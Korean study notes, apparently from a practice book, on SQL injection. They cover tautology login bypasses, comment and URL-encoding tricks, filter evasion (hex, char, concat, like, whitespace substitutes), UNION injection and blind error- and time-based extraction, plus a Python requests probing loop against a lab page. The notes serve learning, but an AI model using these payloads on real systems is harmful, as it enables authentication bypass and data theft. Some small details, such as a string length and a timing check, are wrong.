# SQL Injection 관련 정리

이 글은 '실습으로 배우는 SQL Injection' 이라는 서적을 바탕으로 작성했습니다.





# DB 

Db 마다 다르지만 보통 대소문자를 구별하지 않는다.



#SELECT

DB 를 탐색하거나 조회하기 위한 쿼리를 작성할 때, SELECT 구문을 사용한다.

SELECT [해당 속성] FROM [테이블] 의 형태

Ex) SELECT id FROM user

-> user 테이블로부터 id를 가져와라.



, 콤마를 이용하여 여러 속성을 퀴리문으로 동시에 가져올 수 있다.

*를 사용하면 모든 속성을 가져올 수 있다.



#where

로그인 할 때 특정 조건만 result로 가져오고 싶은 경우 where 을 이용한다.

SELECT [속성] FROM [테이블] WHERE [조건]

==의 비교 연산자가 아닌 = 로 사용되고 나머지 비교연산자와 논리연산자는 보통의 프로그래밍 언어와 같다.



#SELECT * FROM test WHERE 1=1

1=1 가 명백하게 TRUE 를 반환하므로 where 절에서 무조건 true를 가지게 된다.

한 행씩 비교하게 되고 전체 test 테이블의 모든 행과 속성이 SELECT 되게 된다.

-> WHERE 절 이하를 TRUE 로 만드는 경우 모든 정보가 통과된다.



#TRUE 인식되는 경우

0이 아닌 상수 

1=1

12a34 -> 12로 인식 -> true

0k0 -> 0으로 인식 ->false

주의) Where 123 -> true 인 where 문 , where 123=TRUE -> false 를 반환한다.



# php, URL, 쿼리 

GET 형태로 받는 경우

$id = $_GET['id'];

$pw=$_GET['pw'];

$[php 내에서 사용되는 변수] = $_GET[URL로 전달된 인자의 이름];

// 좌변의 id 는 php에서 사용될 변술르 지칭하는 id , 우변의 id 는 URL 에 인자로 존재하는 id이다.

php 에서는 변수의 이름 앞에 $ 가 붙는 특징이 있다. 



is_numeric(파라미터)는 매개변수가 숫자인지 판별에 주는 함수이다.

해당 매개변수가 숫자라면 is_numeric 에서 1이 반환되고 아니라면 0이 반환된다.



URL Form ?id =  & pw =

Query       id=' ' and pw = ' '

쿼리에서 작은 따옴표가 열린 시점부터 인자로 넘겨준 값이 시작되며, 값을 다 넣어준 뒤 바로 원래 존재했던

작은 따옴표가 있음을 유의해야한다.



# ' or ' 1



SELECT ID FROM USER WHERE ID = ' ' or '1 ' and pw = ' ' or '1'



논리 연산자의 우선순위에서 and 보다 or 이 높아 이를 토대로 쿼리를 분석해보면 WHERE가 true 가 된다.



id =admin 인 것을 찾을 때

SELECT ID FROM USER WHERE ID = ' ' or 1# 이 통과가 되면 db 안에 admin 이 있고

admin이 첫 째 행에 위치함을 알 수 있다.



# 암호학과 쿼리



평문 : 암호화가 되지 않은 상태의 TEXT ,

암호문, 비문 : 암호화된 상태의 TEXT 

평문 -> 비문 : 암호화

비문 -> 평문 : 복호화



암호화와 복호화가 가능한  체계, 암호문을 통해 평문을 얻을 수 있는 형태의 알고리즘을 양방향 알고리즘이라고 한다.

반대로, 암호화는 가능하지만 복호화는 불가능한 형태의 알고리즘을 단방향 알고리즘이라고 한다.



# 주석

MySQL 에서 주석표현은

#

--

NULL 과 Line Feed 가 아닌 non-printable char 또는 공백

/**/ 가 있다.



주석은 아니지만 query 를 끊음으로 주석의 기능을 일부 대체하는 ; + NULL 도 있다.



# URL Encoding

URL 에서 사용되는 문자표기



&와 ? 같은 경우 GET 의 표기를 나타내는 특정한 기능을 하고 있다.

GET 을 위한 & 인지 인자로서의 &인지 구분,



print 할 수 없는 문자 줄 바꿈 , 탭 , NULL 같은 경우 URL Encoding 으로 전달할 수ㅜ 있다.



NULL - %00

Tab - %09

Line feed - %0a

#- %23

& - %26

#를 제외한 주석 표현 방법은 URL 을 통해서만 사용할 수 있다.

%23 -? %2523



# Filtering

SQL Injection 에서 preg_match 함수를 통해 주로 필터링 조건이 붙는다.

/[조건1] | [조건2] |  /i 와 같은 방식으로 필터링 조건이 정의되고 넣어준 파라미터가 해당 문자에 해당되는지 검사한다. 해당 문자에 포함되면 True를 반환하고 preg_match 함수 정의에 따라 그 이후의 동작을 수행하게 된다.



Ex) 

if(preg_match('/or/i'),$id){exit(~);}

if(preg_match('/or/i'),$pw){exit(~);}

다음과 같은 preg_match 함수에선 id 와 pw에 or이 들어가게 되면 실행이 종료된다.

따라서 , 다음과 같은 필터링 조건이 붙은 SQL injection 문제는 or 을 이용하지 않고 해결을 해야된다.

or -> || 을 mysql 에서 사용할 수 있다.

or 같은 경우 injection 시도 시 문자이므로 

or 1# 와 같이 쿼리문을 만드는 경우 or 1 사이에 띄어쓰기가 필요하고

||1# 과 같은 경우 || 는 or 과 같은 의미지만 특수문자 이기 때문에 붙여서 사용할 수 있다.

and -> &&, %26%26





# Escape 우회

preg_match('/\ ' | \ " /i) 로 id 나 pw 에 작은 따옴표와 큰 따옴표가 올 수 없는 경우

Escape 문자를 사용한다. That's Right 라는 입력 값은 That 다음의 작은 따옴표에서 닫히는 것으로 인식하여

Error 가 나는 구문이 된다. 작은 따옴표가 자체로 인식되어 문자로 인식하지 않는다.



.php?id=\ &pw=

SELECT id FROM user where id=' \ ' and pw=' '

다음과 같은 URL 과 해당 쿼리의 경우 역 슬래시의 영향으로 작은 따옴표가 문자열을 닫기 위한 작은 따옴표가 아닌

문자 자체의 작은 따옴표로 바뀐다. 결국  SELECT id FROM user where id=' \ ' and pw=' ' 에서

Id =' \ ' and pw = '  ' 는  id='(열림)\ '(x) and pw = '(닫힘) ' 과 같이 따옴표의 역할이 변경 되어

pw='  이후 쿼리문을 다시 설정하여 id = ' ~ pw =' 이후를 설정해 WHERE 문을 True로 만들 수 있다.

그러나 id 자체가 ' and pw = 인 계정이 존재할 수도 있음을 생각해야된다.



Ex) .php?id='\ ' & pw=md5(' ')과 같은 구문도 \ 역슬래시를 이용해서 md5 와 같은 암호화 함수를 아예 무시할 수도 있다.



# UNION 우회

튜플이 하나라도 존재하는 상황과 관계없이 쿼리에 결과를 조작하는 것이 가능하다.

DB 가 비어있거나 admin 이란 id 가 db에 없는 경우 그 전의 방법들은 사용할 수 없게 된다.



Union select 는 쿼리의 결과를 조작할 수 있는 구문이다. 테이블에 행이 존재하지 않아도, 특정 조건을 만족하는 행이 없어도 원하는 결과가 나오도록 조절할 수 있다.

UNION SELECT 는 특정 구문이 끝난 시점에서 사용하면된다. 

Ex) 작은 따옴표가 열러 있는 상태거나 or 나 and 로 문장이 끝나지 않은 상태에서 사용할 수 없다.



 SELECT ID FROM USER WHERE TRUE (여기까지 끝)  + union select 'admin'

User 테이블에 있는 모든 계정 id를 가져오고 결과에 admin을 추가하게 된다.

-> db 가 비어있는 상태에서 admin을 새롭게 추가할 수 있다.



UNION select을 통해 원하는 행을 만들 수 있지만 기존의 결과의 뒤에 만들어줄 수 있다는 것이 중요하다.

즉, 디비가 비어있는 상태라면 UNION select으로 첫 행에 해당되는 행을 만들 수 있지만 이미 디비안에 다른 행들이 존재 한다면 맨 끝 행에 새롭게 생성된다.



또한, Union select 는 쿼리의 결과에 붙기 때문에, 디비의 column 에 맞게 인자의 수를 정해줘야 된다.

Ex) SELECT id,pw FROM USERS union select 'admin','1234' -> id, pw 에 맞게 admin 1234 를 맞춰줘야된다.



@Union select SQL Injection 예시

1. SELECT id FROM USER where id ='0=0' and pw ='0=0' union select 'admin'

id에 0=0 (TRUE) & pw에 0=0 (TRUE) 를 통해 WHERE 문을 TRUE 로 만들고 union select으로 admin을 추가

2. SELECT id FROM USER where id=' or 1# UNION SELECT 'admin



# LIKE 우회

등호 = 가 preg_match 함수에 의해 필터링 조건으로 있는 경우 Like 구문을 이용하여 injection을 진행한다.
부등호를 이용할 수 있지만, 가장 직관적인 등호를 통해 우회하는 것이 가장 효과적이다.
    
like  또한 bool 값을 반환하고 and 와 or 연산자로 확장하여 사용한다

A like B
A 위치에는 기준이 되는 값, B는 비교 대상이 필요
A = B 와 같은 효과를 낼 수 있다. 그러나 % 과 _ 의 문자를 사용하여 등호보다 많은 효과를 낼 수 있다는 것에서 차이가 있다.


% 는 0 개 이상의 모든 글자를 대체할 수 있다.
_는 1개의 모든 글자를 대체할 수 있다.


@admin으로 우회하려는 경우의 예제

Ex)
'admin' like 'admin' -> TRUE 
'admin' like '%' ->       TRUE         %가 admin을 대체
'admin' like 'ad%' ->   TRUE         %가 나머지 min 대체
'admin' like 'd%' ->     FALSE        d% 의 형태이면 d~ 로 시작하는 것만 성립
'admin' like '%d%' -> TRUE          %d% 앞의 % 가 a , 나머지는 min
'admin' like 'admin%' ->TRUE      %는 0개 이상의 모든 글자를 대체한다.
'admin' like 'ad%n'   -> TRUE       %가 m을 대체

'admin' like '_' ->            FALSE  _는 한 글자만 대체할 수 있다.
'admin' like '_min' ->      FALSE  _가 ad를 대체할 수 없다.
'admin' like '_d_min' ->  TRUE 각 _가 a,공백을 대체
'admin' like '_ _ _ _ _' -> TRUE 각 _  a,d,m,i,n 대체
'admin' like 'admin_'   -> FALSE
'admin' like '%mi_'    -> TRUE
'admin' like '_d%n'   -> TRUE

SELECT ID FROM USER WHERE ID= ' ' || id like 'ad_ _ n'#' and pw = ' '
SELECT ID FROM USER WHERE ID= ' ' || id like '_ _ min'#' and pw =' '
와 같은 쿼리문이 가능하다.



# 문자열 우회

admin 자체가 필터링 된 경우(문자열 필터링 경우)

위와 같이 like 와 %,_ 를 같이 이용하는 방법도 존재하나 

hex 로 문자열을 대체하는 방법과 char 로 대체하는 방법 또한 존재한다.

admin -> 0x61646d696e

admin -> char(97,100,109,105,110) 안의 숫자는 각 아스키 코드값에 해당 된다.



Concat 함수 -> 여러 문자열을 병합 해준다 

concat('a','dmi',n') -> 'admin' 에 해당된다.



위 3가지 방법과 UNION SELECT 를 이용하여 admin, # or 이 필터링 된 경우 우회 한다고 가정했을 때

SELECT ID FROM USER WHERE ID = '' ||id=0x61646d696e UNION SELECT '1'

SELECT ID FROM USER WHERE ID = '' ||id=char(97,100,109,105,110) UNION SELECT '1'

SELECT ID FROM USER WHERE ID = '' ||id=concat('a','dmi','n') UNION SELECT '1' 와 같이 우회가 가능하다.



# 공백 우회



쿼리에서 공백을 우회할 수 있는 방법들

/**/ 주석 이지만 공백 역할이 가능하다.

() 괄호를 통한 우회



URL ENCODING

Tab -> %09

Line Feed -> %0a

Vertical Tab -> %0b

Form Feed -> %0c

Carriage Return -> %0d



@%00와 %0a 와 같은 경우 한 글자로 취급되기 때문에 id 와 pw에 제한이 있을 때 유용하게 사용될 수 있다.



# Brute Force Attack 

무차별 대입 공격이라고 불린다.

pw 로 설정할 수 있는 모든 경우의 수를 pw 로 대입하는 공격 기법이다.

Ex) 패스워드가 알파벳 소문자 4자리 ~ 6자리라고 할 때 'aaaa' 부터 'zzzzzz' 까지의 모든 경우의 수를 대입 하는 것이다.



Brute Force Attack 은 크래킹 까지의 시간이 오래 걸리는 대신에 모든 경우의 수를 대입해보는 특성을 가지고 있기 때문에, 크래킹에 성공한다는 장정이 있다.



# Dictionary Attack

사전공격으로 불린다. 

사용자가 설정할만한 패스워드의 목록을 만들어 그 목록에 있는 것들을 대입해보는 것이다.

구글링을 통해 GB 단위의 Dictionary Dump(사전 파일)을 구할 수 있다.

크래킹 전체 시간이 Brute Force Attack 보다는 적게 걸리지만 크래킹에 실패할 수 있다는 단점이 존재한다.





# Length

length(문자열) 함수는 해당 문자열의 길이를 반환해준다.

Ex) 

length('paullab') 구문은 8을 반환한다. 따라서, length('paullab')=8 은 TRUE 를 반환한다고 볼 수 있다.



SELECT ID FROM USER WHERE length(pw)=4  user 테이블에서 pw 길이가 4인 계정을 출력

SELECT ID FROM USER WHERE id='kang' and length(pw)=4 -> 이 쿼리는 위에 쿼리와 다르게 kang 이라는 계정의 pw 필드의 길이가 4인가에 집중하고 있다.



이러한 예시를 통해서 특정 계정의 존재 유무와 해당 계정의 패스워드 길이를 알아낼 수 있다.





# SUBSTR

substr(문자열, index 시작 값, 문자열 길이) 함수

문자열에서 index 시작 값에서 부터 문자열 길이만큼 자른 character 값이 출력된다.

이 때 index 라고 하면 보통 다른 언어에서는 0부터 시작하지만, 이 함수에서 문자열의 index는 1부터 시작한다고 가정한다.



Ex)

substr('admin',1,1) -> 'a'

substr('admin',2,1) -> 'd'

substr('admin',3,1) -> 'i'

substr('admin',1,5)-> admin



substr('admin',1,1) = 'a' 와 같은 구문은 TRUE를 반환하게 된다.



SELECT ID FROM USER WHERE substr(pw,1,1) = 'a'

다음과 같은 쿼리를 통해서 반환되는 ID 들의 pw의 첫 글자가 a 라는 것을 알 수 있다.



SQL에서는 문자열의 우선순위가 z~a 순서로 판별된다.

대소문자를 구분하지 않아 a < B 와 같은 대소 비교도 TRUE로 판별이 된다.

ASCII에서는 a(97) > B(66) 이 성립한다.

패스워드를 알아내도 각각의 글자가 대문자인지 소문자인지 경우의 수를 테스트해봐야 한다.



substr이 필터링되는 경우 mid 함수로 대체 할 수 있다.

mid(문자열,index위치, 문자열 길이) 사용 결과와 파라미터 값은 substr과 동일하다.

mid 함수도 필터링되는 경우

left(문자열, 문자열 길이) - 왼쪽부터 길이만큼 출력

right(문자열,문자열 길이)- 오른쪽부터 길이만큼 출력

다음과 같은 함수로 대체할 수 있는데

substr(pw,2,1) 같은 형태는 left(right(pw,2),1) , right(left(pw,2),1) 과 같은 형태로 해결할 수 있다.



# requests Library

requests 라이브러리는 HTTP 요청을 보낼 때 사용되는 python 라이브러리다. 



import requests

url ="[server IP]:8080/MAMP/chall09.php"

for i in range(0, 30):

​    query = "?num={}".format(i)

​    req = requests.get(url+query)

​    if req.text.find("Correct Query!")!=-1:

​          length=i

​          print("{} is Correct".format(i))



requests 라이브러리와 반복문을 결합하여, 파이썬 실행으로 여러 개의 URL에 접속한다.

req는 네트워크 response에 해당하는 헤더, 상태 코드, 페이지 소스 등을 가지고 있다.



# ord, chr

ord('문자') 는 해당 문자를 ASCII Code의 값으로 변환해 줄 수 있다.

따라서 ord('h')와 ord('H')는 다른 값으로 인식한다.

ord는 or 가 필터링 되어있는 경우 사용할 수 없다.



반대로 chr은 아스키 코드값을 문자로 변환하는 것을 의미한다.

chr('아스키코드값') -> 문자



Ex)

ord('a')=97 , char(97)='a'





# Blind SQL Injection

Blind SQL Injection 는 쿼리에 따라 requests 의 변화를 통해 데이터를 얻어내는 공격법을 말한다.



쿼리의 반환 값으로 에러 메세지를 발생시키도록 하는 것을 이용해 데이터를 얻어내는 기법을 

Error Based Blind SQL injection

반응이 오는 시간을 조작하여 데이터를 유추하고 얻어내는 기법을

Time Based Blind SQL injection 이라고 한다.



# IF

IF(조건 , TRUE 일 때 반환 값 , FALSE 일 때 반환 값)



where id = if(id='admin' and pw='000',A value,B value)

Where id = ' ' || if(id='admin' and length(pw)>0,1,0) 과 같이 응용하여 사용할 수 있다.



# Error Based Blind SQL Injection

에러의 발생에도 종류가 많지만 2가지만 보면

하나는 쿼리 자체가 잘못되어 발생하는 에러고, 다른 하나는 쿼리 자체로는 문제가 없지만 실행 시에 발생되는 에러이다.

단순히 문법적인 문제인 경우와 실행을 했을 때 논리적으로 검출되는 에러가 있다.



@Syntax Error

where id = ' ' || if (1,0,crackus)

쿼리에서 작은 따옴표 처리가 되어있지 않는 문자는 Column 으로 인식한다. 존재하지 않는 column이 등장하면

Syntax 에러를 발생시킨다.



Where id= '' || if(1,0,9eN)

(N은 308이상의 정수)

9e308 부터는 syntax 에러의 범주로 여겨진다. 9e308 이라는 숫자가 들어간 쿼리의 경우 그 자체로 에러로 여겨진다.



Where id=' '||if(1,0,9eN) ( N은 실수 형태의 숫자 )

e 표기법에서 지수가 와야 할 위치에 소수점이 나오는 경우도 syntax 에러의 범주에 속한다.



@Logical Error



where id =' ' || if (1,0,9e307*N) ( Ndms 1.99744.. 이상의 실수)

1.99.. -> 9e307 의 경우에만 해당되는 것이고 보통 9e307*2 로 사용한다.



Where id='admin' and pw ='1234' ||(select 1union select 2)



# Time Based Blind SQL Injection



@sleep(N)

N은 정수

N초 동안 지연시키는 함수이다. if 와 결합한다면, 응답이 오는 시간과 결합하여 원하는 정보를 얻을 수 있다.



Where id= ' ' || if(1,sleep(N),1) -> 모든 행을 가져와 비교하기 때문에 N* 행의 수 만큼 대기시간을 가진다.



@time.time()

time이라는 모듈이 필요하다.

UTC 표기법을 소수점 표기법으로 반환해 주는 함수이다. 파이썬에서는 프로그램이 실행되고 종료될 때 까지의 시간 경과를 측정할 때 사용할 수 있다.



response_time=time.time()

req=Requests.get(url+query)

if response_time-time.time()> sleep시간 +여유시간